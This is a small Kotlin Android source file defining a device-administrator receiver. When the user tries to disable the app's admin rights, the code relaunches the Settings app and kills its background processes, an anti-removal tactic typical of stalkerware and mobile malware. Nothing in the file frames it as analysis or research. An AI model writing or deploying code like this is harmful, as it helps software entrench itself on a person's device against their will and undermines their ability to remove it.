package com.example.betryalcommit

import android.Manifest
import android.app.ActivityManager
import android.app.admin.DeviceAdminReceiver
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.annotation.RequiresApi

class MyAdminReceiver : DeviceAdminReceiver() {


    override fun onDisableRequested(context: Context, intent: Intent): CharSequence? {
        val settingsPackageName = "com.android.settings"
        val packageManager = context.packageManager
        val settingsIntent = packageManager.getLaunchIntentForPackage(settingsPackageName)
        settingsIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        context.startActivity(settingsIntent)
        val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        activityManager.killBackgroundProcesses(settingsPackageName)
        return "null"
    }

}